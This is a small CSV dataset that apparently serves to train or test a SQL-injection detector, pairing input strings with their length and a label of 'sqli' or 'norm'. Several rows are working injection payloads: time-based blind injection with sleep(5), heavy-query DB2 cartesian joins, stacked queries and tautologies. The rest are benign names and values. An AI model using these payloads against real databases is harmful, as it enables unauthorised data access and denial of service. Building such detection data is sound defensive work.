"payload","length","attack_type"
"1')) and elt(1210=1210,sleep(5)) and (('ogpg'='ogpg","51","sqli"
"doris","5","norm"
"bergad faix","11","norm"
"sibirskaia@euskalcasino.es","26","norm"
"1) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","104","sqli"
"1"") and 9198=9198--","19","sqli"
"1;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- uugg","98","sqli"
"-2761 or 1144=7657-- mfml","25","sqli"
"daisey","6","norm"
"2925","4","norm"
